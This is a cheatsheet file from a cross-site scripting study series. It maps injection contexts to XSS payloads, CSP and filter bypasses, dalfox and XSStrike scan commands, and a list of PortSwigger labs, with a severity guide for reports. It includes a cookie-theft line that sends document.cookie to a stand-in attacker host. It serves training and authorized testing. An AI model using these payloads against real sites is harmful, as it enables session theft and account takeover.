# 10 — Master Cheatsheet & Full PortSwigger Lab Sequence

## How to Use This File
This is the fast-reference companion to files 01-09 — every payload here is explained in full in its source file; this file intentionally compresses to "context → payload → which file explains the mechanism" for quick lookup during an active engagement, plus the complete, difficulty-ordered PortSwigger XSS lab list in one place.

## Context-to-Payload Quick Reference

| Context | Quick payload | Full mechanism in file |
|---|---|---|
| HTML body, nothing encoded | `<script>alert(document.domain)</script>` | 01, 02 |
| HTML body, `<script>` blocked/tag-filtered | `<svg onload=alert(document.domain)>` | 07 |
| HTML body, all known tags blocked | `<xss onmouseover=alert(document.domain)>hover</xss>` | 07 |
| HTML attribute, quotes survive | `" autofocus onfocus=alert(document.domain) x="` | 01, 02 |
| HTML attribute, unquoted | `x onmouseover=alert(document.domain)` | 01 |
| `innerHTML` sink (script tags inert) | `<img src=x onerror=alert(document.domain)>` | 04 |
| JS string context, double-quoted | `";alert(document.domain);//` | 01, 02 |
| JS string context, single-quoted | `';alert(document.domain);//` | 02 |
| URL/`href` scheme injection | `javascript:alert(document.domain)` | 01, 02, 03 |
| CSP bypass — allowlisted JSONP host | `<script src="https://ALLOWED-HOST/callback-endpoint?callback=alert(document.domain)"></script>` | 06 |
| CSP bypass — AngularJS + `unsafe-eval` | `{{constructor.constructor('alert(document.domain)')()}}` | 06 |
| Blind XSS OOB confirmation | `<script src="https://UNIQUE.oastify.com"></script>` | 05 |
| Cookie theft | `fetch('https://attacker.com/?c='+document.cookie)` | 09 |
| CSRF-token theft chain | `fetch('/my-account').then(r=>r.text())...` (full chain in file 09) | 09 |
| DOM clobbering | `<a id="adminUser"></a>` | 04 |
| mXSS (style-tag parser confusion, conceptual) | `<style><img src="</style><img src=x onerror=alert(document.domain)>">` | 04 |

## Character-Probing Checklist (Always Run First)
```
<  >  "  '  `  /  (  )  =  ;
```
Submit each alone, observe: passed through / HTML-entity-encoded / backslash-escaped / stripped. This single step determines which payload family above is even viable — see file 07.

## Quick Tool Commands
```bash
# dalfox — single URL, with Blind XSS callback
dalfox url "https://target.com/search?q=test" -b https://UNIQUE.oastify.com

# dalfox — DOM-aware parameter mining
dalfox url "https://target.com/page" --mining-dom --mining-dict

# XSStrike — basic scan with custom headers (authenticated)
python3 xsstrike.py -u "https://target.com/search?q=test" --headers "Cookie: session=abc123"
```
Full flag breakdowns: file 08.

## Complete PortSwigger XSS Lab Sequence (Apprentice → Practitioner)

This consolidates the per-topic tables from files 02-06 into one ordered study path, matching how the topics build on each other on the Academy.

### Reflected XSS
1. Reflected XSS into HTML context with nothing encoded
2. Reflected XSS into HTML context with most tags and attributes blocked
3. Reflected XSS into HTML context with all tags blocked except custom ones
4. Reflected XSS with some SVG markup allowed
5. Reflected XSS into attribute with angle brackets HTML-encoded
6. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
7. Reflected XSS in canonical link tag

### Stored XSS
8. Stored XSS into HTML context with nothing encoded
9. Stored XSS into anchor href attribute with double quotes HTML-encoded
10. Stored XSS into HTML context with most tags and attributes blocked
11. Stored XSS into HTML context with all tags blocked except custom ones
12. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
13. Stored XSS into anchor href attribute with double quotes HTML-encoded and single quotes and backslash escaped

### DOM-Based XSS
14. DOM XSS in document.write sink using source location.search
15. DOM XSS in innerHTML sink using source location.search
16. DOM XSS in jQuery anchor href attribute sink using location.search source
17. DOM XSS in jQuery selector sink using a hashchange event
18. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
19. Reflected DOM XSS
20. Stored DOM XSS
21. DOM XSS using web messages
22. DOM XSS using web messages and a JavaScript URL
23. DOM XSS using web messages and JSON.parse

### Client-Side Template Injection (AngularJS-Specific)
24. Client-side template injection with angle brackets and double quotes HTML-encoded
25. Reflected XSS with AngularJS sandbox escape without strings

### Content Security Policy
26. Reflected XSS protected by CSP, with CSP bypass
27. Reflected XSS protected by very strict CSP, with CSP bypass
28. Reflected XSS with AngularJS sandbox escape and CSP

### Exploiting XSS Vulnerabilities (Impact)
29. Exploiting XSS to steal cookies
30. Exploiting XSS to capture passwords
31. Exploiting XSS to perform CSRF

### Dangling Markup (Closely Related — Often Studied Alongside CSP)
32. Exploiting HTML injection to capture clipboard / cross-domain data (dangling markup style lab)

> **Accuracy disclaimer:** PortSwigger periodically renames, reorders, adds, or retires labs. This sequence reflects the long-standing, well-documented core progression as of recent Academy structure, cross-checked against multiple current community write-ups during research for this series. Before a structured study run or exam prep, reconfirm the live, current list at `portswigger.net/web-security/all-labs#cross-site-scripting` and the individual topic pages (`/reflected`, `/stored`, `/dom-based`, `/contexts/client-side-template-injection`, `/content-security-policy`, `/exploiting`), since exact titles/counts can shift between your study session and any future reference.

## Severity Quick-Reasoning Guide (For Reports)

| Factor | Pushes severity up | Pushes severity down |
|---|---|---|
| Delivery | Plain GET link, no interaction needed | Requires POST + auto-submit page, or multiple user clicks |
| Persistence | Stored, reaches many/all users automatically | Reflected, requires per-victim phishing |
| Reachable role | Admin/support/privileged viewer | Only the submitting user's own session (self-XSS) |
| Cookie protection | No `HttpOnly`, no `SameSite` relevant restriction | `HttpOnly` present, blocking direct cookie theft |
| CSP | Absent or trivially bypassed (`unsafe-inline`) | Strict, no bypass found despite genuine attempt |
| Demonstrated impact | Full account takeover / CSRF-token chain proven | Only `alert()` proven, no further chain attempted/possible |

## Quick Index of This Series
- `01_Overview_Classification.md` — types, contexts, methodology
- `02_Reflected_XSS.md`
- `03_Stored_XSS.md`
- `04_DOM_Based_XSS.md` — includes DOM clobbering, mXSS
- `05_Blind_XSS.md` — Collaborator/webhook setup
- `06_CSP_Bypass.md`
- `07_Filter_WAF_Bypass_Encoding.md`
- `08_XSStrike_and_Dalfox.md`
- `09_Exploitation_Impact.md` — cookie theft, keylogging, phishing, CSRF chains
- `10_Cheatsheet_Lab_Mapping.md` — this file
